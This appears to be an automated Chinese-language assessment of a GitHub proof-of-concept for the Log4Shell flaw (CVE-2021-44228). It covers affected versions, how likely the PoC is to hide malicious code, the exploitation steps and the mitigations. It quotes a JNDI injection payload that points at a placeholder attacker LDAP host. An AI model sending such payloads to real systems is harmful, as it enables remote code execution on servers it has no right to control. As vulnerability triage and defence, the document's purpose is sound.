## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)